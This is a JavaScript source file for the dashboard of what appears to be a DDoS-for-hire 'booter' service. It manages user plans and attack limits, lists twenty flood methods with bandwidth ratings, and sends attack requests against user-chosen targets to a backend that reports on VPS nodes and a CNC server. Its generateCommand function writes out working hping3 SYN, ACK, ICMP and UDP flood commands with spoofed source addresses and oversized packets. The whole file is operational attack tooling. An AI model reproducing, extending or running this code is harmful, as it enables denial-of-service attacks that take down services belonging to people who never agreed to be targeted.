class AttackHub {
    constructor() {
        this.apiUrl = window.auth.apiUrl;
        this.currentStep = 1;
        this.selectedMethod = null;
        this.attackData = {
            target: '',
            port: 80,
            protocol: 'tcp',
            method: '',
            duration: 60,
            power: 5,
            speed: 'medium'
        };
        this.init();
    }
    
    init() {
        this.checkAuth();
        this.setupEventListeners();
        this.loadMethods();
        this.loadAttacks();
        this.startClock();
        this.updateStats();
        
        // Initially hide wizard
        document.getElementById('attackWizard').style.display = 'none';
    }
    
    checkAuth() {
        if (!Auth.isAuthenticated()) {
            window.location.href = 'index.html';
        }
        
        const user = Auth.getUser();
        document.getElementById('usernameDisplay').textContent = user.username;
        document.getElementById('userRole').textContent = user.role.charAt(0).toUpperCase() + user.role.slice(1);
        document.getElementById('userPlan').textContent = user.plan.toUpperCase();
        
        if (user.role === 'owner') {
            document.getElementById('adminMenu').style.display = 'block';
        }
        
        // Update user limits
        this.updateUserLimits(user);
    }
    
    updateUserLimits(user) {
        const concurrentFill = document.getElementById('concurrentFill');
        const concurrentText = document.getElementById('concurrentText');
        const dailyFill = document.getElementById('dailyFill');
        const dailyText = document.getElementById('dailyText');
        
        // This would come from API
        const currentAttacks = 1;
        const maxConcurrent = user.maxConcurrent || 5;
        const dailyUsed = 6;
        const dailyMax = 10;
        
        const concurrentPercent = (currentAttacks / maxConcurrent) * 100;
        const dailyPercent = (dailyUsed / dailyMax) * 100;
        
        concurrentFill.style.width = `${concurrentPercent}%`;
        concurrentText.textContent = `${currentAttacks}/${maxConcurrent}`;
        
        dailyFill.style.width = `${dailyPercent}%`;
        dailyText.textContent = `${dailyUsed}/${dailyMax}`;
    }
    
    setupEventListeners() {
        // Launch attack button
        document.getElementById('launchAttackBtn').addEventListener('click', () => {
            this.showAttackWizard();
        });
        
        // Stop all attacks
        document.getElementById('stopAllBtn').addEventListener('click', () => {
            this.stopAllAttacks();
        });
        
        // Check host button
        document.getElementById('checkHostBtn').addEventListener('click', () => {
            this.showCheckHostModal();
        });
        
        // Close wizard
        document.getElementById('closeWizard').addEventListener('click', () => {
            this.hideAttackWizard();
        });
        
        // Wizard navigation
        document.querySelectorAll('.btn-next').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const nextStep = parseInt(e.target.dataset.next);
                this.goToStep(nextStep);
            });
        });
        
        document.querySelectorAll('.btn-prev').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const prevStep = parseInt(e.target.dataset.prev);
                this.goToStep(prevStep);
            });
        });
        
        // Target input updates
        document.getElementById('targetInput').addEventListener('input', (e) => {
            this.attackData.target = e.target.value;
            this.updateTargetPreview();
        });
        
        document.getElementById('portInput').addEventListener('input', (e) => {
            this.attackData.port = parseInt(e.target.value) || 80;
            this.updateTargetPreview();
        });
        
        document.getElementById('protocolSelect').addEventListener('change', (e) => {
            this.attackData.protocol = e.target.value;
            this.updateTargetPreview();
        });
        
        // Duration input
        document.getElementById('durationInput').addEventListener('input', (e) => {
            this.attackData.duration = parseInt(e.target.value) || 60;
            this.updatePowerEstimate();
        });
        
        // Power slider
        document.getElementById('powerSlider').addEventListener('input', (e) => {
            this.attackData.power = parseInt(e.target.value);
            this.updatePowerEstimate();
        });
        
        // Speed select
        document.getElementById('speedSelect').addEventListener('change', (e) => {
            this.attackData.speed = e.target.value;
            this.updatePowerEstimate();
        });
        
        // Method categories
        document.querySelectorAll('.category-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const category = e.target.dataset.category;
                this.filterMethods(category);
                
                // Update active state
                document.querySelectorAll('.category-btn').forEach(b => {
                    b.classList.remove('active');
                });
                e.target.classList.add('active');
            });
        });
        
        // Final launch button
        document.getElementById('finalLaunchBtn').addEventListener('click', () => {
            this.launchAttack();
        });
        
        // Copy command button
        document.getElementById('copyCommandBtn').addEventListener('click', () => {
            this.copyCommand();
        });
        
        // Cancel wizard
        document.getElementById('cancelWizardBtn').addEventListener('click', () => {
            this.hideAttackWizard();
        });
        
        // Quick attack buttons
        document.querySelectorAll('.btn-quick-attack').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const method = e.target.closest('.quick-method').dataset.method;
                this.launchQuickAttack(method);
            });
        });
        
        // Refresh attacks
        document.getElementById('refreshAttacksBtn').addEventListener('click', () => {
            this.loadAttacks();
        });
        
        // Filter attacks
        document.getElementById('filterAttacks').addEventListener('change', (e) => {
            this.filterAttacks(e.target.value);
        });
        
        // Check now button
        document.getElementById('checkNowBtn').addEventListener('click', () => {
            this.checkHost();
        });
        
        // Theme toggle
        document.getElementById('themeToggle').addEventListener('click', () => {
            this.toggleTheme();
        });
        
        // Logout
        document.getElementById('logoutBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to logout?')) {
                window.auth.logout();
            }
        });
        
        // Search attacks
        document.getElementById('searchAttacks').addEventListener('input', (e) => {
            this.searchAttacks(e.target.value);
        });
    }
    
    showAttackWizard() {
        const wizard = document.getElementById('attackWizard');
        wizard.style.display = 'block';
        this.goToStep(1);
        
        // Reset attack data
        this.attackData = {
            target: '',
            port: 80,
            protocol: 'tcp',
            method: '',
            duration: 60,
            power: 5,
            speed: 'medium'
        };
        
        // Reset form
        document.getElementById('targetInput').value = '';
        document.getElementById('portInput').value = '80';
        document.getElementById('protocolSelect').value = 'tcp';
        document.getElementById('durationInput').value = '60';
        document.getElementById('powerSlider').value = '5';
        document.getElementById('speedSelect').value = 'medium';
        
        this.updateTargetPreview();
        this.updatePowerEstimate();
    }
    
    hideAttackWizard() {
        document.getElementById('attackWizard').style.display = 'none';
    }
    
    goToStep(step) {
        // Validate current step before proceeding
        if (step > this.currentStep) {
            if (!this.validateStep(this.currentStep)) {
                return;
            }
        }
        
        // Update steps
        document.querySelectorAll('.step').forEach(s => {
            s.classList.remove('active');
        });
        document.querySelector(`.step[data-step="${step}"]`).classList.add('active');
        
        // Update content
        document.querySelectorAll('.step-content').forEach(content => {
            content.classList.remove('active');
        });
        document.querySelector(`.step-content[data-step="${step}"]`).classList.add('active');
        
        this.currentStep = step;
        
        // Update summary on step 4
        if (step === 4) {
            this.updateAttackSummary();
        }
    }
    
    validateStep(step) {
        switch(step) {
            case 1:
                if (!this.attackData.target) {
                    this.showNotification('Please enter a target IP or domain', 'error');
                    return false;
                }
                if (!this.attackData.port || this.attackData.port < 1 || this.attackData.port > 65535) {
                    this.showNotification('Please enter a valid port number (1-65535)', 'error');
                    return false;
                }
                return true;
                
            case 2:
                if (!this.selectedMethod) {
                    this.showNotification('Please select an attack method', 'error');
                    return false;
                }
                return true;
                
            case 3:
                if (!this.attackData.duration || this.attackData.duration < 1) {
                    this.showNotification('Please enter a valid duration', 'error');
                    return false;
                }
                return true;
                
            default:
                return true;
        }
    }
    
    updateTargetPreview() {
        document.getElementById('targetPreview').textContent = this.attackData.target || '-';
        document.getElementById('portPreview').textContent = this.attackData.port || '-';
        document.getElementById('protocolPreview').textContent = this.attackData.protocol.toUpperCase() || '-';
    }
    
    async loadMethods() {
        const methodsGrid = document.getElementById('methodsGrid');
        
        // Define all methods
        const methods = [
            {
                id: 'syn-pps',
                name: 'SYN-PPS',
                category: 'syn',
                description: 'High packet rate SYN flood attack',
                icon: 'fa-bolt',
                pps: '100,000+',
                bandwidth: '500 Mbps',
                difficulty: 'Medium',
                power: 7
            },
            {
                id: 'syn-gbps',
                name: 'SYN-GBPS',
                category: 'syn',
                description: 'High bandwidth SYN flood with large packets',
                icon: 'fa-network-wired',
                pps: '10,000',
                bandwidth: '5+ Gbps',
                difficulty: 'High',
                power: 9
            },
            {
                id: 'ack-pps',
                name: 'ACK-PPS',
                category: 'ack',
                description: 'High rate ACK flood attack',
                icon: 'fa-bullseye',
                pps: '80,000+',
                bandwidth: '400 Mbps',
                difficulty: 'Medium',
                power: 6
            },
            {
                id: 'ack-gbps',
                name: 'ACK-GBPS',
                category: 'ack',
                description: 'Bandwidth intensive ACK flood',
                icon: 'fa-tachometer-alt',
                pps: '8,000',
                bandwidth: '4+ Gbps',
                difficulty: 'High',
                power: 8
            },
            {
                id: 'icmp-pps',
                name: 'ICMP-PPS',
                category: 'icmp',
                description: 'High rate ICMP ping flood',
                icon: 'fa-broadcast-tower',
                pps: '150,000+',
                bandwidth: '300 Mbps',
                difficulty: 'Low',
                power: 5
            },
            {
                id: 'icmp-gbps',
                name: 'ICMP-GBPS',
                category: 'icmp',
                description: 'Large packet ICMP flood',
                icon: 'fa-satellite-dish',
                pps: '5,000',
                bandwidth: '3+ Gbps',
                difficulty: 'Medium',
                power: 7
            },
            {
                id: 'rand-udp',
                name: 'RAND-UDP',
                category: 'udp',
                description: 'Random source UDP flood',
                icon: 'fa-random',
                pps: '60,000+',
                bandwidth: '2 Gbps',
                difficulty: 'High',
                power: 8
            },
            {
                id: 'rand-syn',
                name: 'RAND-SYN',
                category: 'syn',
                description: 'Randomized SYN flood',
                icon: 'fa-random',
                pps: '70,000+',
                bandwidth: '1.5 Gbps',
                difficulty: 'High',
                power: 8
            },
            {
                id: 'rand-ack',
                name: 'RAND-ACK',
                category: 'ack',
                description: 'Random source ACK flood',
                icon: 'fa-random',
                pps: '50,000+',
                bandwidth: '1.2 Gbps',
                difficulty: 'High',
                power: 7
            },
            {
                id: 'rand-frpu',
                name: 'RAND-FRPU',
                category: 'advanced',
                description: 'FRPU flag combination flood',
                icon: 'fa-flag',
                pps: '40,000+',
                bandwidth: '800 Mbps',
                difficulty: 'Expert',
                power: 9
            },
            {
                id: 'icmp-ts',
                name: 'ICMP-TS',
                category: 'icmp',
                description: 'ICMP timestamp flood',
                icon: 'fa-clock',
                pps: '30,000+',
                bandwidth: '600 Mbps',
                difficulty: 'Medium',
                power: 6
            },
            {
                id: 'rand-icmp',
                name: 'RAND-ICMP',
                category: 'icmp',
                description: 'Random source ICMP flood',
                icon: 'fa-random',
                pps: '45,000+',
                bandwidth: '900 Mbps',
                difficulty: 'High',
                power: 7
            },
            {
                id: 'udp-multi',
                name: 'UDP-MULTI',
                category: 'udp',
                description: 'Multi-packet UDP flood',
                icon: 'fa-layer-group',
                pps: '20,000+',
                bandwidth: '1 Gbps',
                difficulty: 'Medium',
                power: 6
            },
            {
                id: 'udp-sip',
                name: 'UDP-SIP',
                category: 'udp',
                description: 'SIP protocol specific flood',
                icon: 'fa-phone',
                pps: '15,000+',
                bandwidth: '500 Mbps',
                difficulty: 'Expert',
                power: 8
            },
            {
                id: 'syn-rand',
                name: 'SYN-RAND',
                category: 'syn',
                description: 'Randomized SYN with data',
                icon: 'fa-random',
                pps: '55,000+',
                bandwidth: '1.8 Gbps',
                difficulty: 'High',
                power: 8
            },
            {
                id: 'ack-rmac',
                name: 'ACK-RMAC',
                category: 'ack',
                description: 'Random MAC address ACK flood',
                icon: 'fa-ethernet',
                pps: '35,000+',
                bandwidth: '1.4 Gbps',
                difficulty: 'Expert',
                power: 9
            },
            {
                id: 'syn-multi',
                name: 'SYN-MULTI',
                category: 'syn',
                description: 'Multi-vector SYN flood',
                icon: 'fa-layer-group',
                pps: '25,000+',
                bandwidth: '1.2 Gbps',
                difficulty: 'High',
                power: 7
            },
            {
                id: 'icmp-rand',
                name: 'ICMP-RAND',
                category: 'icmp',
                description: 'Random ICMP data flood',
                icon: 'fa-random',
                pps: '40,000+',
                bandwidth: '1 Gbps',
                difficulty: 'High',
                power: 7
            },
            {
                id: 'ack-rand',
                name: 'ACK-RAND',
                category: 'ack',
                description: 'Randomized ACK flood',
                icon: 'fa-random',
                pps: '48,000+',
                bandwidth: '1.6 Gbps',
                difficulty: 'High',
                power: 8
            },
            {
                id: 'oblivion',
                name: 'OBLIVION',
                category: 'advanced',
                description: 'Ultimate combination attack',
                icon: 'fa-skull-crossbones',
                pps: '100,000+',
                bandwidth: '10+ Gbps',
                difficulty: 'Expert',
                power: 10
            }
        ];
        
        // Render methods
        methodsGrid.innerHTML = methods.map(method => `
            <div class="method-card" data-method="${method.id}" data-category="${method.category}">
                <div class="method-card-header">
                    <div class="method-card-title">
                        <div class="method-icon-small">
                            <i class="fas ${method.icon}"></i>
                        </div>
                        <div>
                            <h4>${method.name}</h4>
                            <span class="method-type">${method.category.toUpperCase()}</span>
                        </div>
                    </div>
                    <div class="method-power">
                        <span class="power-badge">${method.power}/10</span>
                    </div>
                </div>
                <p class="method-description">${method.description}</p>
                <div class="method-stats">
                    <div class="method-stat">
                        <i class="fas fa-tachometer-alt"></i>
                        <span>${method.pps} PPS</span>
                    </div>
                    <div class="method-stat">
                        <i class="fas fa-network-wired"></i>
                        <span>${method.bandwidth}</span>
                    </div>
                    <div class="method-stat">
                        <i class="fas fa-signal"></i>
                        <span>${method.difficulty}</span>
                    </div>
                </div>
            </div>
        `).join('');
        
        // Add click event to method cards
        document.querySelectorAll('.method-card').forEach(card => {
            card.addEventListener('click', (e) => {
                const methodId = e.currentTarget.dataset.method;
                this.selectMethod(methodId);
            });
        });
    }
    
    selectMethod(methodId) {
        // Remove previous selection
        document.querySelectorAll('.method-card').forEach(card => {
            card.classList.remove('selected');
        });
        
        // Add selection to clicked card
        const selectedCard = document.querySelector(`.method-card[data-method="${methodId}"]`);
        selectedCard.classList.add('selected');
        
        this.selectedMethod = methodId;
        this.attackData.method = methodId;
        
        this.showNotification(`Selected method: ${methodId.toUpperCase()}`, 'success');
    }
    
    filterMethods(category) {
        document.querySelectorAll('.method-card').forEach(card => {
            if (category === 'all' || card.dataset.category === category) {
                card.style.display = 'block';
            } else {
                card.style.display = 'none';
            }
        });
    }
    
    updatePowerEstimate() {
        const power = this.attackData.power;
        const duration = this.attackData.duration;
        const speed = this.attackData.speed;
        
        // Calculate estimates based on power and speed
        let basePPS = 10000;
        let baseBW = 500; // Mbps
        
        switch(speed) {
            case 'low':
                basePPS *= 0.5;
                baseBW *= 0.5;
                break;
            case 'medium':
                basePPS *= 1;
                baseBW *= 1;
                break;
            case 'high':
                basePPS *= 2;
                baseBW *= 2;
                break;
            case 'max':
                basePPS *= 5;
                baseBW *= 5;
                break;
        }
        
        // Apply power multiplier
        const pps = Math.round(basePPS * (power / 5));
        const bw = Math.round(baseBW * (power / 5));
        
        // Estimate VPS usage
        const vpsUsed = Math.max(1, Math.round(power / 2));
        
        // Update UI
        document.getElementById('estimatedPPS').textContent = pps.toLocaleString();
        document.getElementById('estimatedBW').textContent = `${(bw / 1000).toFixed(1)} Gbps`;
        document.getElementById('vpsUsed').textContent = vpsUsed;
    }
    
    updateAttackSummary() {
        document.getElementById('summaryTarget').textContent = `${this.attackData.target}:${this.attackData.port}`;
        document.getElementById('summaryMethod').textContent = this.selectedMethod ? this.selectedMethod.toUpperCase() : '-';
        document.getElementById('summaryDuration').textContent = `${this.attackData.duration} seconds`;
        document.getElementById('summaryPower').textContent = `${this.attackData.power}/10 (${this.attackData.speed})`;
        document.getElementById('summaryVPS').textContent = document.getElementById('vpsUsed').textContent;
        
        // Calculate impact
        const impact = this.attackData.power * (this.attackData.duration / 60);
        let impactText = 'Low';
        if (impact > 30) impactText = 'High';
        else if (impact > 15) impactText = 'Medium';
        
        document.getElementById('summaryImpact').textContent = impactText;
        
        // Generate command preview
        this.generateCommand();
    }
    
    generateCommand() {
        if (!this.selectedMethod || !this.attackData.target) {
            document.getElementById('generatedCommand').textContent = 'Select method and target first';
            return;
        }
        
        const method = this.selectedMethod;
        const target = this.attackData.target;
        const port = this.attackData.port;
        const duration = this.attackData.duration;
        
        let command = `sudo timeout ${duration}s hping3`;
        
        // Add method-specific options
        if (method.includes('syn')) {
            command += ` -S --flood`;
            if (method.includes('gbps')) {
                command += ` --data 65495`;
            }
            if (port) {
                command += ` -p ${port}`;
            }
        } else if (method.includes('ack')) {
            command += ` -A --flood`;
            if (method.includes('gbps')) {
                command += ` --data 65495`;
            }
            if (port) {
                command += ` -p ${port}`;
            }
        } else if (method.includes('icmp')) {
            command += ` --icmp --flood`;
            if (method.includes('gbps')) {
                command += ` --data 65495`;
            }
        } else if (method.includes('udp')) {
            command += ` --udp --flood`;
            if (method.includes('rand')) {
                command += ` --rand-source`;
            }
            if (port) {
                command += ` -p ${port}`;
            }
        }
        
        // Add random source if method contains 'rand'
        if (method.includes('rand') && !method.includes('udp')) {
            command += ` --rand-source`;
        }
        
        // Add target
        command += ` ${target}`;
        
        document.getElementById('generatedCommand').textContent = command;
    }
    
    async launchAttack() {
        if (!this.validateStep(4)) {
            return;
        }
        
        const user = Auth.getUser();
        
        // Check user limits
        const response = await Auth.makeRequest('/attacks');
        const myAttacks = response.ongoing.filter(a => a.userId === user.id).length;
        
        if (myAttacks >= (user.maxConcurrent || 5)) {
            this.showNotification('You have reached your concurrent attack limit', 'error');
            return;
        }
        
        if (this.attackData.duration > (user.maxDuration || 60)) {
            this.showNotification('Duration exceeds your maximum allowed duration', 'error');
            return;
        }
        
        try {
            const attackData = {
                target: this.attackData.target,
                port: this.attackData.port,
                method: this.selectedMethod,
                duration: this.attackData.duration,
                power: this.attackData.power
            };
            
            const result = await Auth.makeRequest('/attack', {
                method: 'POST',
                body: JSON.stringify(attackData)
            });
            
            if (result.message) {
                this.showNotification('Attack launched successfully!', 'success');
                this.hideAttackWizard();
                this.loadAttacks();
                this.updateStats();
            }
        } catch (error) {
            this.showNotification(error.message || 'Failed to launch attack', 'error');
        }
    }
    
    async launchQuickAttack(method) {
        // Prompt for target
        const target = prompt('Enter target IP or domain:');
        if (!target) return;
        
        const port = prompt('Enter port (default: 80):', '80');
        if (!port) return;
        
        const duration = prompt('Enter duration in seconds (default: 60):', '60');
        if (!duration) return;
        
        try {
            const attackData = {
                target: target.trim(),
                port: parseInt(port) || 80,
                method: method,
                duration: parseInt(duration) || 60
            };
            
            const result = await Auth.makeRequest('/attack', {
                method: 'POST',
                body: JSON.stringify(attackData)
            });
            
            if (result.message) {
                this.showNotification('Quick attack launched!', 'success');
                this.loadAttacks();
            }
        } catch (error) {
            this.showNotification(error.message || 'Failed to launch attack', 'error');
        }
    }
    
    async loadAttacks() {
        const attacksList = document.getElementById('attacksList');
        
        try {
            const data = await Auth.makeRequest('/attacks');
            
            if (data.ongoing.length === 0) {
                attacksList.innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-bolt"></i>
                        <h3>No ongoing attacks</h3>
                        <p>Launch your first attack using the wizard above</p>
                    </div>
                `;
                return;
            }
            
            const user = Auth.getUser();
            let attacks = data.ongoing;
            
            // Filter by user role
            if (user.role !== 'owner') {
                attacks = attacks.filter(a => a.userId === user.id);
            }
            
            attacksList.innerHTML = attacks.map(attack => {
                const startTime = new Date(attack.startTime);
                const now = new Date();
                const elapsed = Math.floor((now - startTime) / 1000);
                const progress = Math.min(100, (elapsed / attack.duration) * 100);
                
                return `
                    <div class="attack-item" data-attack-id="${attack.id}">
                        <div class="attack-item-header">
                            <div class="attack-info">
                                <span class="attack-id">#${attack.id.slice(-6)}</span>
                                <span class="attack-status status-running">RUNNING</span>
                                <span class="attack-user">${attack.username}</span>
                            </div>
                            <div class="attack-time">
                                Started: ${startTime.toLocaleTimeString()}
                            </div>
                        </div>
                        
                        <div class="attack-details">
                            <div class="detail-item">
                                <span class="detail-label">Target</span>
                                <span class="detail-value">${attack.target}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Method</span>
                                <span class="detail-value">${attack.method}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Duration</span>
                                <span class="detail-value">${attack.duration}s</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Elapsed</span>
                                <span class="detail-value">${elapsed}s</span>
                            </div>
                        </div>
                        
                        <div class="attack-progress">
                            <div class="progress-info">
                                <span class="progress-time">${elapsed}s / ${attack.duration}s</span>
                                <span class="progress-percent">${Math.round(progress)}%</span>
                            </div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: ${progress}%"></div>
                            </div>
                        </div>
                        
                        <div class="attack-actions">
                            <button class="btn-stop-attack" onclick="window.attackHub.stopAttack('${attack.id}')">
                                <i class="fas fa-stop"></i> Stop Attack
                            </button>
                            <button class="btn-view-details" onclick="window.attackHub.viewAttackDetails('${attack.id}')">
                                <i class="fas fa-info-circle"></i> Details
                            </button>
                        </div>
                    </div>
                `;
            }).join('');
            
            // Update ongoing badge
            document.getElementById('ongoingBadge').textContent = attacks.length;
            document.getElementById('quickAttacks').textContent = attacks.length;
            
        } catch (error) {
            attacksList.innerHTML = `
                <div class="error-state">
                    <i class="fas fa-exclamation-circle"></i>
                    <h3>Error loading attacks</h3>
                    <p>${error.message}</p>
                </div>
            `;
        }
    }
    
    async stopAttack(attackId) {
        if (!confirm('Stop this attack?')) return;
        
        try {
            await Auth.makeRequest(`/attack/stop/${attackId}`, { method: 'POST' });
            this.showNotification('Attack stopped', 'success');
            this.loadAttacks();
        } catch (error) {
            this.showNotification(error.message, 'error');
        }
    }
    
    async stopAllAttacks() {
        if (!confirm('Stop ALL ongoing attacks?')) return;
        
        try {
            await Auth.makeRequest('/attack/stop-all', { method: 'POST' });
            this.showNotification('All attacks stopped', 'success');
            this.loadAttacks();
        } catch (error) {
            this.showNotification(error.message, 'error');
        }
    }
    
    filterAttacks(filter) {
        const attacks = document.querySelectorAll('.attack-item');
        
        attacks.forEach(attack => {
            switch(filter) {
                case 'mine':
                    // Implement user filter logic
                    attack.style.display = 'block';
                    break;
                case 'active':
                    // Implement status filter logic
                    attack.style.display = 'block';
                    break;
                default:
                    attack.style.display = 'block';
            }
        });
    }
    
    searchAttacks(query) {
        const attacks = document.querySelectorAll('.attack-item');
        const searchTerm = query.toLowerCase();
        
        attacks.forEach(attack => {
            const text = attack.textContent.toLowerCase();
            attack.style.display = text.includes(searchTerm) ? 'block' : 'none';
        });
    }
    
    viewAttackDetails(attackId) {
        // Implement attack details view
        this.showNotification('Attack details feature coming soon', 'info');
    }
    
    showCheckHostModal() {
        const modal = document.getElementById('checkHostModal');
        modal.style.display = 'block';
        
        // Close modal handlers
        modal.querySelector('.close-modal').addEventListener('click', () => {
            modal.style.display = 'none';
        });
        
        window.onclick = (e) => {
            if (e.target === modal) {
                modal.style.display = 'none';
            }
        };
    }
    
    async checkHost() {
        const host = document.getElementById('checkHostInput').value;
        const port = document.getElementById('checkPortInput').value;
        const type = document.getElementById('checkTypeSelect').value;
        
        if (!host) {
            this.showNotification('Please enter a host to check', 'error');
            return;
        }
        
        try {
            const result = await Auth.makeRequest('/check-host', {
                method: 'POST',
                body: JSON.stringify({ ip: host, port: port, type: type })
            });
            
            const resultsDiv = document.getElementById('checkResults');
            const resultsContent = resultsDiv.querySelector('.results-content');
            
            resultsContent.innerHTML = `
                <div class="check-success">
                    <i class="fas fa-check-circle"></i>
                    <h5>Check completed successfully</h5>
                    <pre>${JSON.stringify(result, null, 2)}</pre>
                </div>
            `;
            
            resultsDiv.style.display = 'block';
            this.showNotification('Host check completed', 'success');
            
        } catch (error) {
            this.showNotification('Host check failed: ' + error.message, 'error');
        }
    }
    
    async updateStats() {
        try {
            const data = await Auth.makeRequest('/dashboard');
            
            // Update VPS stats
            const onlineVPS = data.stats.activeVPS;
            document.getElementById('onlineVPS').textContent = onlineVPS;
            document.getElementById('quickVPS').textContent = onlineVPS;
            document.getElementById('vpsBadge').textContent = onlineVPS;
            
            // Update CNC status
            const cncStatus = document.getElementById('cncStatus');
            cncStatus.textContent = data.stats.cncStatus === 'active' ? 'ONLINE' : 'OFFLINE';
            cncStatus.className = `status-value ${data.stats.cncStatus === 'active' ? 'online' : 'offline'}`;
            
            // Update today's stats (mock data for now)
            document.getElementById('todayAttacks').textContent = data.attackHistory?.length || 0;
            document.getElementById('successRate').textContent = '95%';
            document.getElementById('totalBW').textContent = '15.2 Gbps';
            document.getElementById('avgDuration').textContent = '45s';
            
        } catch (error) {
            console.error('Failed to update stats:', error);
        }
    }
    
    startClock() {
        function updateClock() {
            const now = new Date();
            const timeStr = now.toLocaleTimeString();
            const dateStr = now.toLocaleDateString();
            
            document.getElementById('currentTime').textContent = timeStr;
            document.getElementById('systemTime').textContent = `${dateStr} ${timeStr}`;
        }
        
        updateClock();
        setInterval(updateClock, 1000);
    }
    
    copyCommand() {
        const command = document.getElementById('generatedCommand').textContent;
        navigator.clipboard.writeText(command).then(() => {
            this.showNotification('Command copied to clipboard!', 'success');
        });
    }
    
    toggleTheme() {
        document.body.classList.toggle('dark-theme');
        const icon = document.querySelector('#themeToggle i');
        if (document.body.classList.contains('dark-theme')) {
            icon.classList.remove('fa-moon');
            icon.classList.add('fa-sun');
        } else {
            icon.classList.remove('fa-sun');
            icon.classList.add('fa-moon');
        }
    }
    
    showNotification(message, type = 'info') {
        const container = document.getElementById('notificationContainer');
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
                <span>${message}</span>
            </div>
            <button class="close-notification">&times;</button>
        `;
        
        container.appendChild(notification);
        
        // Auto remove
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOut 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }
        }, 5000);
        
        // Close button
        notification.querySelector('.close-notification').addEventListener('click', () => {
            notification.remove();
        });
    }
}

// Initialize attack hub
window.attackHub = new AttackHub();
